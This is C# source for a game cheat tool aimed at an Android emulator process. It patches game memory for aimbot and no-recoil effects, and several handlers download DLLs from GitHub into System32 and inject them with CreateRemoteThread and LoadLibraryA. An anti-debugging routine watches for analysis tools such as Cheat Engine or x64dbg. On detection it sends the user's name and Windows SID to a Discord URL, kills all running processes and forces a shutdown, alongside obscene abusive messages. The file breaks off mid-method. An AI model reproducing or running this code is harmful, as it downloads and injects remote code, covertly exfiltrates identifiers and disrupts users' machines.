using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using Memory;
using System.Net;
using System.Runtime.InteropServices;
using System.IO;
using System.Security.Principal;
using System.Net.Http;
using static microsoft.Form2;
using System.Media;
using System.Threading.Tasks;
using Guna.UI2.WinForms;

namespace microsoft
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            InitializeComponent();


        }
        Mem sasuke = new Mem();

        private void guna2ControlBox1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            Login frm = new Login();
            frm.Show();
            this.Hide();
        }
        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {

            if (keyData == (Keys.F8 | Keys.F9))
            {

                guna2Button3.PerformClick();
                return true;
            }

            return base.ProcessCmdKey(ref msg, keyData);
        }
        public int aimbot = 29 - 28;
        private int aimbot2d;
        private int roundaimrotate;
        private int entityStructvalue;
        private int aimbot3d;
        private int aimbot4d;
        private int aimbot5d;
        private int aimbot6d;
        private int entity;
        public bool isSeprator2 = false;

        public bool IsSeprator()
        {
            aimbot2d = aimbot + aimbot;
            roundaimrotate = 155 + aimbot2d;
            entityStructvalue = 157 - roundaimrotate;
            aimbot3d = aimbot + aimbot2d;
            aimbot4d = aimbot2d + aimbot + aimbot;
            aimbot5d = aimbot + aimbot2d + aimbot + 1;
            aimbot6d = aimbot3d + aimbot + aimbot + 1;
            entity = 99 - aimbot3d;

            if (aimbot == 29 - 28)
            {
                if (aimbot2d == 2)
                {
                    if (aimbot3d == 3)
                    {
                        if (aimbot4d == 4)
                        {
                            if (aimbot5d == 5)
                            {
                                if (aimbot6d == 6)
                                {
                                    entity = 99 - 3 + entityStructvalue;
                                    isSeprator2 = true;
                                }
                            }
                        }
                    }
                }
            }
            return false;
        }
        public bool RecheckMemoryRead(Int64 address, out int result)
        {
            try
            {
                result = sasuke.ReadMemory<int>(address.ToString("X"));
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Memory read failed at address {address:X}: {ex.Message}");
                result = 0;
                return false;
            }
        }

        private async void guna2Button3_Click(object sender, EventArgs e)
        {
              Int32 proc = Process.GetProcessesByName("HD-Player")[0].Id;
                sasuke.OpenProcess(proc);
                status.Text = "Activating..";
                var result = await sasuke.AoBScan("FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A5 43 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 BF", true, true);
                if (result.Any())
                {
                    const int BaseOffset = 40;
                    int BaseOffset2 = BaseOffset * aimbot;
                    const int AdditionalOffset1 = 32;
                    const int AdditionalOffset2 = 10 + 6;
                    int SecureRead = BaseOffset * 2 - BaseOffset2;
                    int SecureWrite = AdditionalOffset1 * aimbot * 1;
                    int MixOffset = SecureRead + SecureWrite + AdditionalOffset2;
                    foreach (var CurrentAddress in result)
                    {
                        IsSeprator();
                        if (isSeprator2)
                        {
                            Int64 read = CurrentAddress + 0x60;
                            Int64 mix = CurrentAddress + MixOffset;
                            Int64 remix = CurrentAddress + 0x2c;
                            var Read = sasuke.ReadMemory<int>(read.ToString("X"));
                            var Mix = sasuke.ReadMemory<int>(mix.ToString("X"));
                            var Remix = sasuke.ReadMemory<int>(remix.ToString("X"));


                            if (mix == 0 || mix == 572662306)
                            {
                                if (!RecheckMemoryRead(read, out int readValue) ||
                                      !RecheckMemoryRead(mix, out int mixValue) ||
                                      !RecheckMemoryRead(remix, out int remixValue))
                                {
                                    Console.WriteLine("Mix Memory Checking failed, skipping this address.");
                                    continue;
                                }
                            }
                            else
                            {
                                if (!RecheckMemoryRead(read, out int readValue) ||
                                     !RecheckMemoryRead(mix, out int mixValue) ||
                                     !RecheckMemoryRead(remix, out int remixValue))
                                {
                                    Console.WriteLine("Memory Read failed, skipping this address.");
                                    continue;
                                }
                                Int64 write = CurrentAddress + 0x5c;
                                sasuke.WriteMemory(write.ToString("X"), "int", Read.ToString());
                                Console.Beep(250, 300);
                            }

                        }
                    }
                    status.Text = "Aimbot v29 Activated";
                }
            
            
        }

        private async void guna2Button5_Click(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "81 95 E3 3F 0A D7 A3 3D 00 00 00 00 00 00 5C 43 00 00 8C 42 00 00 B4 42 96 00 00 00 00 00 00 00 00 00 00 3F 00 00 80 3E 00 00 00 00 05 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F 33 33 33 3F 9A 99 99 3F 00 00 80 3F 00 00 00 00 00 00 80 3F CD CC 4C 3F 00 00 80 3F",
};

            List<string> replaceList = new List<string>
{
              "81 95 E3 3F 0A D7 A3 3D 00 00 00 00 00 00 5C 43 00 00 8C 42 00 00 B4 42 96 00 00 00 00 00 00 00 00 00 00 3D 00 00 80 3C 00 00 00 00 05 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F 33 33 33 3F 9A 99 99 3F 00 00 80 3F 00 00 00 00 00 00 80 3F CD CC 4C 3F 00 00 80 3F",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "AWM ACTIVATED ✔";
                }
                else
                {
                    status.Text = "Failed";
                }
            }
        }

        private async void guna2Button7_Click(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "00 00 60 40 CD CC 8C 3F 8F C2 F5 3C CD CC CC 3D 07 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 41 00 00 48 42 00 00 00 3F 33 33 13 40 00 00 B0 3F 00 00 80 3F 01 00 00 00",
};

            List<string> replaceList = new List<string>
{
              "00 00 60 40 CD CC 8C 3F 8F C2 F5 3C CD CC CC 3D 07 00 00 00 00 00 B0 FF 00 00 00 00 00 00 F0 41 00 00 48 42 00 00 00 3F 33 33 13 40 00 00 B0 3F 00 00 80 3F 01 00 00 00",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "SCOP ACTIVATED ✔";
                }
                else
                {
                    status.Text = "Failed";
                }
            }
        }

        private async void guna2Button6_Click(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "9A 99 19 3F 00 00 80 3E 00 00 00 00 05 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F CD CC 4C 3F CD",
};

            List<string> replaceList = new List<string>
{
              "9A 99 19 3C 00 00 F5 3C 00 00 00 00 05 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F CD CC 4C 3F CD",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "M82B ACTIVATED ✔";
                }
                else
                {
                    status.Text = "Failed";
                }
            }
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;

        private WebClient webclient = new WebClient();
        private void guna2Button2_Click(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\sysmain32_1.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://github.com/ABDULLAH100K/Abdullah/raw/main/sysmain32_1.dll";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            Process targetProcess = Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "sysmain32_1.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        

        private void Page1_Click(object sender, EventArgs e)
        {

        }

        private void guna2TabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button10_Click(object sender, EventArgs e)
        {
            CleanTempFiles();

        }
        private void CleanTempFiles()
        {

        }


        private void guna2Button9_Click(object sender, EventArgs e)
        {

        }
        private bool iscrackerapruning11(string processName)
        {
            Process[] processes = Process.GetProcessesByName(processName);
            return processes.Length > 0;
        }
        private async void SendMessage(string title, string message)
        {
            using (HttpClient client = new HttpClient())
            {
                var values = new Dictionary<string, string>
        {
            { "title", title },
            { "message", message }
        };

                var content = new FormUrlEncodedContent(values);

                try
                {
                    var response = await client.PostAsync("https://discord.com/channels/1144868481930645566/1271487393744162897", content);
                    var responseString = await response.Content.ReadAsStringAsync();
                    MessageBox.Show("Message sent: " + responseString);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Failed to send message: " + ex.Message);
                }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            bool iscrackerapruning = iscrackerapruning11("ProcessHacker");
            bool iscrackerapruning1 = iscrackerapruning11("Procx64");
            bool iscrackerapruning2 = iscrackerapruning11("x64dbg");
            bool iscrackerapruning3 = iscrackerapruning11("Cheat Engine");
            bool iscrackerapruning4 = iscrackerapruning11("CheatEngine-x86_64-SSE4-AVX2");
            bool iscrackerapruning5 = iscrackerapruning11("dnspy");
            bool iscrackerapruning6 = iscrackerapruning11("cheatengine-i386");
            bool iscrackerapruning7 = iscrackerapruning11("cheatengine-x86_64");
            bool iscrackerapruning8 = iscrackerapruning11("Clean Engine");
            bool iscrackerapruning9 = iscrackerapruning11("CleanEngine-x86_64-SSE4-AVX2");
            bool iscrackerapruning0 = iscrackerapruning11("cleanengine-i386");
            bool iscrackerapruning01 = iscrackerapruning11("cleanengine-x86_64");
            if (iscrackerapruning || iscrackerapruning1 || iscrackerapruning2 || iscrackerapruning3 || iscrackerapruning4 || iscrackerapruning5 || iscrackerapruning6 || iscrackerapruning7 || iscrackerapruning8 || iscrackerapruning9 || iscrackerapruning0 || iscrackerapruning01)
            {
                MessageBox.Show("I Fuck Your Sisters Pussy So Hard Cracker");

                SendMessage("Cracker Information", "'''pc name : " + Environment.UserName + "'''\n ''' HWID : " + WindowsIdentity.GetCurrent().User.Value + "'''");
                Process[] processes = Process.GetProcesses();
                MessageBox.Show("I Fuck Your Sister,s Pussy So Hard Cracker");
                Application.Exit();
                foreach (Process process in processes)
                {
                    MessageBox.Show("I Fuck Your Sisters Pussy So Hard Cracker");
                    Application.Exit();

                    try
                    {
                        process.Kill();
                        MessageBox.Show("I Fuck Your Sisters Pussy So Hard Cracker");
                        Application.Exit();
                    }
                    catch (Exception)
                    {
                        Process.Start("shutdown", "/s /t 0");
                        MessageBox.Show("I Fuck Your Sisters Pussy So Hard Cracker");
                        Application.Exit();
                    }
                    MessageBox.Show("I Fuck Your Sisters Pussy So Hard Cracker");
                    Application.Exit();
                }
            }
        }


        private async void guna2Button8_Click_1(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "00 00 60 40 CD CC 8C 3F 8F C2 F5 3C CD CC CC 3D 07 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 41 00 00 48 42 00 00 00 3F 33 33 13 40 00 00 B0 3F 00 00 80 3F 01 00 00 00",
};

            List<string> replaceList = new List<string>
{
              "00 00 60 40 CD CC FF FF 8F C2 ff ff CD CC ff ff 07 B1 ff ff 00 00 FF FF 00 00 00 00 00 00 f0 41 00 00 48 42 00 00 00 3f 33 33 13 40 00 00 b0 3f 00 00 29 5C 01 00 00 00",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "SCOP ACTIVATED ✔";
                }
                else
                {
                    status.Text = "Failed";
                }
            }
        }

        private async void guna2Button9_Click_1(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "00 00 60 40 CD CC 8C 3F 8F C2 F5 3C CD CC CC 3D 07 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 41 00 00 48 42 00 00 00 3F 33 33 13 40 00 00 B0 3F 00 00 80 3F 01 00 00 00",
};

            List<string> replaceList = new List<string>
{
              "00 00 60 40 CD cc 8C 3f 8F C2 ff ff CD CC ff ff 07 b1 ff ff 00 00 ff ff 00 00 00 00 00 00 f0 41 00 00 48 42 00 00 00 3f 33 33 13 40 00 00 b0 3f 00 00 29 5c 01 00 00 00",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "SCOP ACTIVATED ✔";
                }
                else
                {
                    status.Text = "Failed";
                }

            }
        }

        private void Form2_Load_1(object sender, EventArgs e)
        {

        }


        private void timer2_Tick(object sender, EventArgs e)
        {

        }

        private async void guna2Button10_Click_1(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "00 0a 81 ee 10 0a 10 ee 10 8c bd e8 00 00 7a 44 f0 48 2d e9 10 b0 8d e2 02 8b 2d ed 08 d0 4d e2 00 50 a0 e1 10 1a 08 ee 08 40 95 e5 00 00 54 e3",
};

            List<string> replaceList = new List<string>
{
              "00 0a 81 ee 10 0a 10 ee 10 8c bd e8 00 00 ef 44 f0 48 2d e9 10 b0 8d e2 02 8b 2d ed 08 d0 4d e2 00 50 a0 e1 10 1a 08 ee 08 40 95 e5 00 00 54 e3",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "NORECOIL ACTIVATED ✔";
                }
                else
                {
                    status.Text = "Failed";
                }
            }
        }

        private async void guna2Button11_Click(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "02 BO CA FD ?? 70 4C 2D E9 10 B0 8D E2 01 40 A0 E1 00 50 A0 E1 F3 05 05 E3",
};

            List<string> replaceList = new List<string>
{
              "02 B0 CA FD 02 70 4C 2D E9 1E B0 2F E1 01 40 A0 E1 00 50 A0 E1 F3 05 05 E3",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Activating ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "V-BAGE ACTIVATED ✔";
                }
                else
                {
                    status.Text = "Failed";
                }
            }
        }

        private async void guna2Button12_Click(object sender, EventArgs e)
        {
            List<string> searchList = new List<string>
{

              "10 4C 2D E9 08 B0 8D E2 0C 01 9F E5 00 00 8F E0",
};

            List<string> replaceList = new List<string>
{
              "01 00 A0 E3 1E FF 2F E1 0C 01 9F E5 00 00 8F E0",
};

            bool k = false;

            if (Process.GetProcessesByName("HD-Player").Length == 0)
            {
                status.Text = "Open Emulator";
            }
            else
            {
                sasuke.OpenProcess("HD-Player");
                status.Text = "Removing ...";

                int i2 = 22000000;

                for (int j = 0; j < searchList.Count; j++)
                {
                    IEnumerable<long> cu = await sasuke.AoBScan(searchList[j], writable: true);
                    string u = "0x" + cu.FirstOrDefault().ToString("X");

                    if (cu.Count() != 0)
                    {
                        for (int i = 0; i < cu.Count(); i++)
                        {
                            i2++;
                            sasuke.WriteMemory(cu.ElementAt(i).ToString("X"), "bytes", replaceList[j]);
                        }
                        k = true;
                    }
                }

                if (k == true)
                {
                    status.Text = "REMOVED ✔";
                }
                else
                {
                    status.Text = "Failed";
                }
            }
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            string discordServerUrl = "https://discord.gg/CdB4xCDunn";
            try
            {
                System.Diagnostics.Process.Start(discordServerUrl);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to open URL: " + ex.Message);
            }
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            string discordServerUrl = "https://www.youtube.com/@THE_DOMINATOR-v1";
            try
            {
                System.Diagnostics.Process.Start(discordServerUrl);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to open URL: " + ex.Message);
            }
        }

        private async void guna2Button4_Click_1(object sender, EventArgs e)
        {

        }

        private async void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
        {


        }

        private void guna2Button13_Click(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\wall-3d.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://github.com/khawarahemad/Charms-DLL/raw/main/wall-3d.dll";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            Process targetProcess = Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "wall-3d.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        private void guna2Button15_Click(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\BLUE_AND_WHITE.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://github.com/khawarahemad/Charms-DLL/raw/main/BLUE_AND_WHITE.dll";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            Process targetProcess = Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "BLUE_AND_WHITE.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        private void guna2Button14_Click(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\ChamsRed_1.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://github.com/khawarahemad/Charms-DLL/raw/main/ChamsRed_1.dll";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            Process targetProcess = Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "ChamsRed_1.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        private void guna2Button16_Click(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\FX_BLUE_BOX.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://github.com/khawarahemad/Charms-DLL/raw/main/FX_BLUE_BOX.dll";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            Process targetProcess = Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "FX_BLUE_BOX.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        private void guna2Button17_Click(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\FX_CHAMS.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://github.com/khawarahemad/Charms-DLL/raw/main/FX_CHAMS.dll";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            Process targetProcess = Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "FX_CHAMS.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
